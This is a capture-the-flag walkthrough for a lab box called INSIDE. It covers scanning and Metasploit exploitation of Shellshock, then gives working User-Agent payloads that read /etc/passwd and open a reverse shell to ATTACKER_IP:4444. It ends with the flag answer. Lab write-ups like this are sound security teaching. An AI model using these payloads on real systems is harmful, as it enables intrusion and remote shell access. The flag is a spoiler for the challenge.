# INSIDE

## Challenge

> Something here inside — can you catch it?

**Flag format:** `flag{}`

---

## Walkthrough

### 1. Initial enumeration

Start by identifying the target's open ports:

```bash
nmap <TARGET_IP> -T5
```

The scan reveals three open ports: **22**, **80**, and **3389**.

Next, enumerate their services and run Nmap's default scripts:

```bash
nmap <TARGET_IP> -T5 -sV -sC -A -p 22,80,3389
```

Here, `-sV` probes service versions, `-sC` runs default NSE scripts, `-A` enables additional detection, and `-p` restricts the scan to the specified ports.

This scan does not reveal an immediate path to the flag.

### 2. Inspecting the website

Reviewing the web page's source code reveals a comment containing a useful hint:

```text
flag in /home
```

Run a web-server scan with Nikto:

```bash
nikto --host <TARGET_IP>
```

The scan identifies **CVE-2014-6271 (Shellshock)** as a potential vulnerability.

### 3. Exploitation with Metasploit

Launch Metasploit and search for a module associated with the discovered CVE:

```text
search cve-2014-6271
```

Select the matching exploit from the search results. In the recorded run, it appeared as option `1`:

```text
use 1
options
set RHOSTS <TARGET_IP>
set TARGETURI /cgi-bin/status
run
```

The exploit provides a Meterpreter session.

### 4. Locating the flag

The earlier HTML comment points to `/home`. Inspect that directory and read the discovered `inside` file:

```bash
ls -la /home
cat /home/inside
```

### Alternative approach: Shellshock through the User-Agent header

Shellshock can also be tested by placing a crafted payload in the HTTP `User-Agent` header. The example below reads `/etc/passwd`:

```http
User-Agent: () { :; }; echo; /bin/cat /etc/passwd
```

For a reverse-shell approach, start a listener:

```bash
nc -lvnp 4444
```

Then send a request with the following `User-Agent` payload, replacing `ATTACKER_IP` with the listener's address:

```http
User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Once a shell is available, the flag can be read from `/home/inside` as described above.

---

<details>
<summary><strong>🚩 Reveal Flag</strong></summary>

```text
FLAG{InSiDe_ShOcK_WaVe_StAy_HoMe_StAy_SaFe}
```

</details>
